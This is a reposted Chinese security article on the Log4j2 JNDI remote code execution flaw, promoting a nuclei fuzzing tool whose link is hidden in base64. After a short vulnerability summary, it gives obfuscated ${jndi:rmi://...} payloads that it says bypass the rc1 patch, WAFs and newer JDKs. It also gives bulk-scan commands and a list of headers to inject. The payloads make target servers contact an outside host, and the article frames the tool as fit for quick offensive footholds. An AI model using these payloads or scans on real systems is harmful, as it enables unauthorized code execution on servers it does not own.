> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/hhGXj26d1mBPYLiam8EUAA)

**漏洞描述**

     由于 Apache Log4j2 某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，Apache Struts2、Apache Solr、Apache Druid、Apache Flink 等均受影响。

**影响版本**

  
    Apache Log4j 2.x < 2.15.0-rc2

**影响范围**

      含有该漏洞的 Log4j 影响到超过 6000 个中间件或应用，目前已知的可能受影响的应用及组件包括但不限于如下清单中所列出的：

*   Spring-Boot-strater-log4j2
    
*   Apache Struts2
    
*   Apache Solr
    
*   Apache Flink
    
*   Apache Druid
    
*   ElasticSearch
    
*   Flume
    
*   Dubbo
    
*   Redis
    
*   Logstash
    
*   Kafka
    

**fuzz 检测工具**

本工具主要针对 log4j 来批量 fuzzz 请求头检测，轻量级，虽然有些鸡肋，但还是能检测到不少漏洞，适合快速打点，自带 dns，默认使用 interactsh 的 dnslog

项目地址：aHR0cHM6Ly9naXRodWIuY29tL3Rlc3Q1MDJnaXQvbG9nNGotZnV6ei1oZWFkLXBvYw==

### v2 版本

添加了绕过 rc1 的 poc 也同时能绕过常见主流 waf，还有高版本 jdk 绕过

```
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}
${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}
${jndi:rmi://adsasd.asdasd.asdasd}
${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}
```

使用
==

```
/nuclei -t log4j-fuzz-head-poc.yaml -u http://www.test.com  -o res.txt  -rl 30 单个检测  速率为30

/nuclei -t log4j-fuzz-head-poc.yaml -l urls.txt  -o res.txt   -rl 30   批量检测  速率为30
```

![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM4cGZjKX2LKqmIibbAbVqkPAiaNggF4ka7PPwH3qHH6uPZErbh1yqlicYWJ0Ccniao65QRmXE9icbvQ9iaA/640?wx_fmt=png)

*   X-Client-IP
    
*   X-Remote-IP
    
*   X-Remote-Addr
    
*   X-Forwarded-For
    
*   X-Originating-IP
    
*   User-Agent
    
*   Referer
    
*   CF-Connecting_IP
    
*   True-Client-IP
    
*   X-Forwarded-For
    
*   Originating-IP
    
*   X-Real-IP
    
*   X-Client-IP
    
*   Forwarded
    
*   Client-IP
    
*   Contact
    
*   X-Wap-Profile
    
*   X-Api-Version
    

最后  

-----

**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。**

**无害实验室 sec 拥有对此文章的修改和解释权如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的**